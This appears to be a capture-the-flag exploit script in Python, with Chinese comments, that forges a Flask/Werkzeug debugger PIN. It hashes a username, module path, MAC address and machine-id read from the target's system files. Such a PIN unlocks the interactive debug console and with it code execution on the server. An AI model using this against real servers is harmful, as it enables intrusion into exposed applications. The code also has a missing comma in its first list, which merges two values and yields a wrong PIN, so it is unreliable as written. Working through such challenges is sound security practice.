import hashlib
from itertools import chain

probably_public_bits = [
    'xsctf'#/etc/passwd
    'flask.app',#默认值
    'Flask',#默认值
    '/usr/local/lib/python3.7/site-packages/flask/app.py'#moddir，报错得到
]

private_bits = [
    '2485378547714',# /sys/class/net/eth0/address 十进制
    '6e1d32ebf38c587c4a41089c0c744c831058e402c220fb812e6b6f638c904d0af802b85cdd93cc673933b5f9aeaeb7d4'
    #看上面machine-id部分
]

# 下面为源码里面抄的，不需要修改
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
